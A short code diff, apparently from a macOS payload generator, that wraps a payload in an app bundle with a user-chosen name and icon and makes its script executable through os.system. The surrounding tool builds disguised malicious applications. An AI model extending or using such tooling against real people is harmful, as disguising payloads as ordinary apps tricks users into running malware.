@@ -29,7 +29,6 @@ class payload:
 cp -r resources/application.app payloads/macos_application
 mv payloads/macos_application/application.app payloads/macos_application/"""+name+""".app
 mv """+icon+""" payloads/macos_application/"""+name+""".app/Contents/Resources/Powershell.icns
-chmod +x payloads/macos_application/"""+name+""".app/Contents/MacOS/PowerShell.sh
                         """)
 		payload_save_path = "payloads/macos_application/"+name+".app/Contents/MacOS/PowerShell.sh"
                 sas = "payloads/macos_application/"+name+".app"
@@ -40,6 +39,7 @@ chmod +x payloads/macos_application/"""+name+""".app/Contents/MacOS/PowerShell.s
 		f = open(payload_save_path,"w")
 		f.write(payload)
 		f.close()
+		os.system("chmod +x payloads/macos_application/"""+name+""".app/Contents/MacOS/PowerShell.sh")
 		h.info_general("Payload saved to " + sas)
 
 
